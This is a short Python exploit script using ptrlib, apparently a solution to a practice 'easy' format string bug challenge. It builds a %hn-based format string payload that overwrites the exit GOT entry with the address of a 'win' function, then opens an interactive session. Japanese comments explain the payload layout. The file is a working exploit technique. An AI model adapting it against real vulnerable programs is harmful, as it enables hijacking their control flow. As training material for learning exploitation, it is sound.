from ptrlib import *


binpath = "../../../problems/stack/fsb/easy"
libcpath = "/usr/lib/libc.so.6"
io = Process(binpath)
elf = ELF(binpath)
libc = ELF(libcpath)


# before FSB: *ptr == before
# after FSB: *ptr == after
def fsb_payload(ptr, before, after):
    before = p64(before)
    after = p64(after)

    fsb_list = []
    for i in range(4):
        if u16(before[2 * i : 2 * i + 2]) == u16(after[2 * i : 2 * i + 2]):
            continue
        value = u16(after[2 * i : 2 * i + 2])
        fsb_list.append([ptr + 2 * i, value])

    max_bytes = len(fsb_list) * 13  # %12345c%10$hn ← 13文字
    max_bytes_aligned = (max_bytes + 7) // 8 * 8

    payload = ""
    printed_bytes = 0
    for i, (_, value) in enumerate(fsb_list):
        addr_pos_in_stack = 6 + max_bytes_aligned // 8 + i
        nbytes = value - printed_bytes % 0x10000
        if nbytes < 0:
            nbytes += 0x10000
        payload += f"%{nbytes}c%{addr_pos_in_stack}$hn"
        printed_bytes += nbytes
    payload += "\0" * (max_bytes_aligned - len(payload))
    payload = payload.encode()

    # 8 byte ごとに改行を入れて出力
    for i in range(0, len(payload), 8):
        print(payload[i : min(i + 8, len(payload))])

    for addr, _ in fsb_list:
        payload += p64(addr)

    assert len(payload) <= 0x30
    return payload


def main():
    addr_exit_got = elf.got("exit") or 0
    addr_exit_plt = elf.plt("exit") or 0
    addr_win = elf.symbol("win") or 0

    payload = fsb_payload(addr_exit_got, addr_exit_plt + 6, addr_win)
    io.sendafter("Input message\n", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
